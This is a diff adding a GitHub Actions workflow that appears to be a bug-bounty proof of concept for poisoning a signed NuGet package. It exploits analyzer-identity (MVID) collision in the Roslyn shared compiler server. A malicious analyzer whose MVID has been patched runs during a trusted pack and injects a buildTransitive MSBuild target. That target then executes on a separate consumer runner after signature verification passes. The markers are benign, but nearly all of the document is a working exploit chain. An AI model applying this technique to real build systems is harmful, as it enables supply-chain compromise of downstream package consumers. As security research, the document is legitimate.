@@ -1,0 +1,336 @@
+name: roslyn-cross-runner-signed-package-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-cross-runner-signed-package-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  produce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Produce poisoned artifact from trusted release stage
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/cross-runner-fixtures /tmp/cross-runner-workspace /tmp/cross-runner-release
+          rm -f /tmp/CROSS_RUNNER_ANALYZER_MARKER
+          mkdir -p /tmp/cross-runner-fixtures/{trusted,malicious,reader}
+          mkdir -p /tmp/cross-runner-release
+
+          cat > /tmp/cross-runner-fixtures/trusted/CollisionAnalyzer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cp /tmp/cross-runner-fixtures/trusted/CollisionAnalyzer.csproj /tmp/cross-runner-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/cross-runner-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB007", "Lab", "Trusted", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/cross-runner-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.IO;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB007", "Lab", "Stale", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      File.WriteAllText("/tmp/CROSS_RUNNER_ANALYZER_MARKER", ctx.Compilation.AssemblyName ?? "<null>");
+                      if (ctx.Compilation.AssemblyName == "TrustedPackage")
+                      {
+                          File.WriteAllText(
+                              "/tmp/cross-runner-workspace/buildTransitive/Trusted.Package.CrossRunner.targets",
+                              "<Project>" +
+                              "<Target Name=\"CrossRunnerInjectedTarget\" BeforeTargets=\"CoreCompile\">" +
+                              "<WriteLinesToFile File=\"/tmp/CROSS_RUNNER_CONSUMER_MARKER\" " +
+                              "Lines=\"ATTACKER_CODE_FROM_SIGNED_CROSS_RUNNER_PACKAGE\" Overwrite=\"true\" />" +
+                              "</Target></Project>");
+                      }
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/cross-runner-fixtures/reader/MvidReader.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          cat > /tmp/cross-runner-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var stream = File.OpenRead(args[0]);
+          using var pe = new PEReader(stream);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/cross-runner-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/cross-runner-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/cross-runner-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted=/tmp/cross-runner-fixtures/trusted/bin/Release/net10.0/CollisionAnalyzer.dll
+          malicious=/tmp/cross-runner-fixtures/malicious/bin/Release/net10.0/CollisionAnalyzer.dll
+          reader=/tmp/cross-runner-fixtures/reader/bin/Release/net10.0/MvidReader.dll
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          test "$th" != "$mh"
+
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          data=bytearray(p.read_bytes())
+          assert data.count(old)==1, data.count(old)
+          i=data.index(old); data[i:i+16]=new; p.write_bytes(data)
+          PY
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+
+          echo "PRODUCER_TRUSTED_MVID=$th"
+          echo "PRODUCER_PATCHED_ATTACKER_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" "$malicious"
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          mkdir -p /tmp/cross-runner-workspace/tools
+          cp "$malicious" /tmp/cross-runner-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/cross-runner-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          echo 'internal static class PoisonOnly { }' > /tmp/cross-runner-workspace/Class1.cs
+
+          export RoslynCommandLineLogFile=/tmp/cross-runner-producer.log
+          dotnet build /tmp/cross-runner-workspace/Package.csproj -c Release -t:Rebuild \
+            -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/CROSS_RUNNER_ANALYZER_MARKER
+          echo "PRODUCER_POISON_STAGE_ANALYZER_EXECUTION=BLOCKED"
+
+          rm -rf /tmp/cross-runner-workspace
+          mkdir -p /tmp/cross-runner-workspace/{tools,buildTransitive}
+          cp "$trusted" /tmp/cross-runner-workspace/tools/CollisionAnalyzer.dll
+          cat > /tmp/cross-runner-workspace/buildTransitive/Trusted.Package.CrossRunner.targets <<'EOF'
+          <Project>
+            <Target Name="TrustedHarmlessTarget" BeforeTargets="CoreCompile">
+              <Message Text="Trusted package" Importance="Low" />
+            </Target>
+          </Project>
+          EOF
+
+          cat > /tmp/cross-runner-workspace/Package.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <AssemblyName>TrustedPackage</AssemblyName>
+              <PackageId>Trusted.Package.CrossRunner</PackageId>
+              <Version>1.0.0</Version>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup>
+              <Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" />
+              <None Include="buildTransitive/Trusted.Package.CrossRunner.targets"
+                    Pack="true"
+                    PackagePath="buildTransitive/Trusted.Package.CrossRunner.targets" />
+            </ItemGroup>
+          </Project>
+          EOF
+          echo 'public static class TrustedLibrary { public const string Value = "TRUSTED"; }' > /tmp/cross-runner-workspace/Class1.cs
+
+          cmp "$trusted" /tmp/cross-runner-workspace/tools/CollisionAnalyzer.dll
+          dotnet pack /tmp/cross-runner-workspace/Package.csproj -c Release -o /tmp/cross-runner-release \
+            -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/CROSS_RUNNER_ANALYZER_MARKER
+          grep -q '^TrustedPackage$' /tmp/CROSS_RUNNER_ANALYZER_MARKER
+          unzip -p /tmp/cross-runner-release/Trusted.Package.CrossRunner.1.0.0.nupkg \
+            buildTransitive/Trusted.Package.CrossRunner.targets | grep -q 'CrossRunnerInjectedTarget'
+          echo "PRODUCER_TRUSTED_PACKAGE_TAMPERING=CONFIRMED"
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+
+          openssl req -x509 -newkey rsa:2048 \
+            -keyout /tmp/cross-runner-root.key \
+            -out /tmp/cross-runner-root.crt \
+            -sha256 -days 1 -nodes \
+            -subj "/CN=Cross Runner Release Root" \
+            -addext "basicConstraints=critical,CA:TRUE" \
+            -addext "keyUsage=critical,keyCertSign,cRLSign" >/dev/null 2>&1
+
+          openssl req -newkey rsa:2048 \
+            -keyout /tmp/cross-runner-signer.key \
+            -out /tmp/cross-runner-signer.csr \
+            -nodes -subj "/CN=Cross Runner Release Signer" >/dev/null 2>&1
+
+          cat > /tmp/cross-runner-signer.ext <<'EOF'
+          basicConstraints=critical,CA:FALSE
+          keyUsage=critical,digitalSignature
+          extendedKeyUsage=codeSigning
+          subjectKeyIdentifier=hash
+          authorityKeyIdentifier=keyid,issuer
+          EOF
+
+          openssl x509 -req \
+            -in /tmp/cross-runner-signer.csr \
+            -CA /tmp/cross-runner-root.crt \
+            -CAkey /tmp/cross-runner-root.key \
+            -CAcreateserial \
+            -out /tmp/cross-runner-signer.crt \
+            -days 1 -sha256 \
+            -extfile /tmp/cross-runner-signer.ext >/dev/null 2>&1
+
+          openssl pkcs12 -export \
+            -out /tmp/cross-runner-signer.pfx \
+            -inkey /tmp/cross-runner-signer.key \
+            -in /tmp/cross-runner-signer.crt \
+            -certfile /tmp/cross-runner-root.crt \
+            -passout pass:securitylab >/dev/null 2>&1
+
+          sdk_base=$(dotnet --info | awk '/Base Path/{print $3; exit}')
+          sudo sh -c "cat /tmp/cross-runner-root.crt >> '$sdk_base/trustedroots/codesignctl.pem'"
+
+          dotnet nuget sign /tmp/cross-runner-release/Trusted.Package.CrossRunner.1.0.0.nupkg \
+            --certificate-path /tmp/cross-runner-signer.pfx \
+            --certificate-password securitylab \
+            --overwrite
+
+          unzip -l /tmp/cross-runner-release/Trusted.Package.CrossRunner.1.0.0.nupkg | grep -F '.signature.p7s'
+          cp /tmp/cross-runner-root.crt /tmp/cross-runner-release/release-root.crt
+          hostname > /tmp/cross-runner-release/producer-host.txt
+          sha256sum /tmp/cross-runner-release/Trusted.Package.CrossRunner.1.0.0.nupkg | tee /tmp/cross-runner-release/package.sha256
+
+          echo "PRODUCER_POISONED_PACKAGE_SIGNED=CONFIRMED"
+          echo "PRODUCER_HOST=$(cat /tmp/cross-runner-release/producer-host.txt)"
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: signed-poisoned-nupkg
+          path: /tmp/cross-runner-release/
+          if-no-files-found: error
+
+  consume:
+    needs: produce
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    steps:
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - uses: actions/download-artifact@v4
+        with:
+          name: signed-poisoned-nupkg
+          path: /tmp/incoming-release
+
+      - name: Verify and consume signed package on clean runner
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -f /tmp/CROSS_RUNNER_CONSUMER_MARKER
+
+          producer_host=$(cat /tmp/incoming-release/producer-host.txt)
+          consumer_host=$(hostname)
+          echo "PRODUCER_HOST=$producer_host"
+          echo "CONSUMER_HOST=$consumer_host"
+          test "$producer_host" != "$consumer_host"
+          echo "SEPARATE_HOSTED_RUNNERS=CONFIRMED"
+
+          sha256sum -c /tmp/incoming-release/package.sha256
+          unzip -l /tmp/incoming-release/Trusted.Package.CrossRunner.1.0.0.nupkg | grep -F '.signature.p7s'
+          unzip -p /tmp/incoming-release/Trusted.Package.CrossRunner.1.0.0.nupkg \
+            buildTransitive/Trusted.Package.CrossRunner.targets | grep -q 'CrossRunnerInjectedTarget'
+
+          sdk_base=$(dotnet --info | awk '/Base Path/{print $3; exit}')
+          sudo sh -c "cat /tmp/incoming-release/release-root.crt >> '$sdk_base/trustedroots/codesignctl.pem'"
+          dotnet nuget verify /tmp/incoming-release/Trusted.Package.CrossRunner.1.0.0.nupkg --all
+          echo "FRESH_RUNNER_TRUSTED_SIGNATURE_VERIFICATION=PASS"
+
+          mkdir -p /tmp/cross-runner-consumer
+          cat > /tmp/cross-runner-consumer/Consumer.csproj <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>net10.0</TargetFramework></PropertyGroup>
+            <ItemGroup>
+              <PackageReference Include="Trusted.Package.CrossRunner" Version="1.0.0" />
+            </ItemGroup>
+          </Project>
+          EOF
+          cat > /tmp/cross-runner-consumer/NuGet.Config <<'EOF'
+          <configuration>
+            <packageSources>
+              <clear />
+              <add key="signed-local-release" value="/tmp/incoming-release" />
+            </packageSources>
+          </configuration>
+          EOF
+
+          dotnet restore /tmp/cross-runner-consumer/Consumer.csproj -v:q
+          grep -F "Trusted.Package.CrossRunner.targets" /tmp/cross-runner-consumer/obj/Consumer.csproj.nuget.g.targets
+          dotnet build /tmp/cross-runner-consumer/Consumer.csproj -c Release --no-restore -v:q
+
+          test -e /tmp/CROSS_RUNNER_CONSUMER_MARKER
+          grep -q 'ATTACKER_CODE_FROM_SIGNED_CROSS_RUNNER_PACKAGE' /tmp/CROSS_RUNNER_CONSUMER_MARKER
+
+          echo "CROSS_MACHINE_SIGNED_PACKAGE_EXECUTION=CONFIRMED"
+          echo "NO_PRODUCER_VBCSCOMPILER_ON_CONSUMER=CONFIRMED"
+          cat /tmp/CROSS_RUNNER_CONSUMER_MARKER
